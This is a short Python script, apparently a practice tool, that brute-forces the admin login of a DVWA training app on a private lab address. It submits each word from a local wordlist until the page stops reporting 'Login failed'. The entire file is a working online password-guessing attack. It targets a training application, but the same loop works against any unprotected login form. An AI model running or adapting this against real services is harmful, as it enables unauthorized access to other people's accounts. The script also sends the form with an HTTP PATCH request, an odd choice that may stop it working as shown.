import requests

target_url = "http://10.0.2.4/dvwa/login.php"
login_info_dict ={"username": "admin", "password": "", "Login": "submit"}


with open("C:\\Users\\dharm\\PycharmProjects\\crawler\\password.txt", "r") as password_list:
        for line in password_list:
            word = line.strip()
            login_info_dict["password"] = word
            response = requests.patch(target_url , data= login_info_dict)
            if "Login failed" not in response.content.decode():
                print("[+] Got the password -->" + word)
                exit()


print("[+] Reached the end of line")                